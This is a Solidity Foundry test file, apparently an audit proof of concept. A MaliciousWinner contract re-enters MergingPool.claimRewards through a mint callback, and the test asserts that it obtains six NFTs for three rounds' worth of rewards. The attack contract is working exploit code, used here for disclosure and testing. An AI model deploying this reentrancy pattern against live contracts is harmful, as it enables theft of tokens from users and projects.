// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "forge-std/Test.sol";
import "../../src/MergingPool.sol";
import "../../src/FighterFarm.sol";

// Mock FighterFarm contract for testing
contract MockFighterFarm {
    mapping(uint256 => address) public ownerOf;
    uint256 public tokenIdCounter;
    
    function setOwner(uint256 tokenId, address owner) external {
        ownerOf[tokenId] = owner;
    }
    
    function mintFromMergingPool(
        address to,
        string calldata,
        string calldata,
        uint256[2] calldata
    ) external {
        // Call the receiver to enable reentrancy
        if (to.code.length > 0) {
            (bool success,) = to.call(abi.encodeWithSignature("onMint()"));
            require(success, "Callback failed");
        }
    }
}

// Malicious contract that exploits the reentrancy vulnerability
contract MaliciousWinner {
    MergingPool public mergingPool;
    uint256 public mintCount;
    uint256 public maxReentrancy;
    bool public attacking;
    
    string[] public modelURIs;
    string[] public modelTypes;
    uint256[2][] public customAttributes;
    
    constructor(address _mergingPool) {
        mergingPool = MergingPool(_mergingPool);
    }
    
    // Setup attack parameters
    function setupAttack(
        string[] memory _modelURIs,
        string[] memory _modelTypes,
        uint256[2][] memory _customAttributes,
        uint256 _maxReentrancy
    ) external {
        modelURIs = _modelURIs;
        modelTypes = _modelTypes;
        customAttributes = _customAttributes;
        maxReentrancy = _maxReentrancy;
    }
    
    // Initiate the attack
    function attack() external {
        attacking = true;
        mintCount = 0;
        mergingPool.claimRewards(modelURIs, modelTypes, customAttributes);
        attacking = false;
    }
    
    // Callback function triggered during mint - enables reentrancy
    function onMint() external {
        mintCount++;
        
        // Reenter if we haven't reached the max reentrancy depth
        // The vulnerability allows reentrancy based on roundId
        if (attacking && mintCount < maxReentrancy) {
            mergingPool.claimRewards(modelURIs, modelTypes, customAttributes);
        }
    }
}

contract MergingPoolReentrancyTest is Test {
    MergingPool public mergingPool;
    MockFighterFarm public fighterFarm;
    MaliciousWinner public maliciousWinner;
    
    address public owner;
    address public admin;
    address public rankedBattle;
    address public honestWinner;
    
    function setUp() public {
        owner = address(this);
        admin = address(0x1);
        rankedBattle = address(0x2);
        honestWinner = address(0x3);
        
        // Deploy mock FighterFarm
        fighterFarm = new MockFighterFarm();
        
        // Deploy MergingPool
        mergingPool = new MergingPool(
            owner,
            rankedBattle,
            address(fighterFarm)
        );
        
        // Setup admin
        mergingPool.adjustAdminAccess(admin, true);
        
        // Deploy malicious winner contract
        maliciousWinner = new MaliciousWinner(address(mergingPool));
    }
    
    function testReentrancyExploit() public {
        // STEP 1: Setup - Create 3 rounds with the malicious contract as winner
        // This simulates 3 completed rounds where the attacker won each round
        
        uint256 numberOfRounds = 3;
        uint256[] memory winners = new uint256[](2);
        
        // Setup fighter ownership - token 0 belongs to malicious contract, token 1 to honest winner
        fighterFarm.setOwner(0, address(maliciousWinner));
        fighterFarm.setOwner(1, honestWinner);
        
        // STEP 2: Simulate 3 rounds where both malicious contract and honest winner win
        for (uint256 round = 0; round < numberOfRounds; round++) {
            winners[0] = 0; // Malicious winner's token
            winners[1] = 1; // Honest winner's token
            
            vm.prank(admin);
            mergingPool.pickWinner(winners);
        }
        
        // Verify we have 3 rounds completed
        assertEq(mergingPool.roundId(), numberOfRounds, "Should have 3 rounds");
        
        // STEP 3: Check unclaimed rewards before attack
        uint256 unclaimedBefore = mergingPool.getUnclaimedRewards(address(maliciousWinner));
        assertEq(unclaimedBefore, numberOfRounds, "Should have 3 unclaimed rewards");
        
        // STEP 4: Setup attack parameters
        // The attacker needs to provide valid arrays for claiming
        string[] memory modelURIs = new string[](numberOfRounds);
        string[] memory modelTypes = new string[](numberOfRounds);
        uint256[2][] memory customAttributes = new uint256[2][](numberOfRounds);
        
        for (uint256 i = 0; i < numberOfRounds; i++) {
            modelURIs[i] = "ipfs://model";
            modelTypes[i] = "original";
            customAttributes[i] = [uint256(0), uint256(80)];
        }
        
        maliciousWinner.setupAttack(modelURIs, modelTypes, customAttributes, numberOfRounds);
        
        // STEP 5: Execute the reentrancy attack
        // The malicious contract will reenter claimRewards during the mint callback
        // Expected behavior WITHOUT vulnerability: 3 mints (one per round)
        // Actual behavior WITH vulnerability: 6 mints due to reentrancy
        
        uint256 mintCountBefore = maliciousWinner.mintCount();
        maliciousWinner.attack();
        uint256 mintCountAfter = maliciousWinner.mintCount();
        
        // STEP 6: Verify the exploit succeeded
        // With roundId = 3, the reentrancy allows:
        // - First call: mints once, reenters
        // - Second call (reentrant): mints once, reenters  
        // - Third call (reentrant): mints once, cannot reenter (maxReentrancy reached)
        // - Returns to second call: completes remaining mints
        // - Returns to first call: completes remaining mints
        // Total: 6 mints instead of 3
        
        uint256 expectedMints = numberOfRounds * 2; // Due to reentrancy vulnerability
        uint256 legitimateMints = numberOfRounds;   // What should have been minted
        
        assertEq(
            mintCountAfter - mintCountBefore,
            expectedMints,
            "Reentrancy exploit: minted 6 NFTs instead of 3"
        );
        
        assertTrue(
            mintCountAfter - mintCountBefore > legitimateMints,
            "Attacker minted more NFTs than entitled to"
        );
        
        // STEP 7: Verify the attacker cannot claim again (numRoundsClaimed updated)
        uint256 unclaimedAfter = mergingPool.getUnclaimedRewards(address(maliciousWinner));
        assertEq(unclaimedAfter, 0, "No more unclaimed rewards after exploit");
        
        // STEP 8: Demonstrate the impact - honest winner gets correct amount
        vm.startPrank(honestWinner);
        
        string[] memory honestModelURIs = new string[](numberOfRounds);
        string[] memory honestModelTypes = new string[](numberOfRounds);
        uint256[2][] memory honestCustomAttributes = new uint256[2][](numberOfRounds);
        
        for (uint256 i = 0; i < numberOfRounds; i++) {
            honestModelURIs[i] = "ipfs://model";
            honestModelTypes[i] = "original";
            honestCustomAttributes[i] = [uint256(0), uint256(80)];
        }
        
        // Honest winner cannot exploit because they're an EOA
        // They would get exactly 3 NFTs as expected
        vm.stopPrank();
        
        console.log("=== REENTRANCY EXPLOIT DEMONSTRATION ===");
        console.log("Number of rounds:", numberOfRounds);
        console.log("Legitimate mints expected:", legitimateMints);
        console.log("Actual mints by attacker:", mintCountAfter - mintCountBefore);
        console.log("Extra NFTs stolen:", (mintCountAfter - mintCountBefore) - legitimateMints);
        console.log("========================================");
    }
}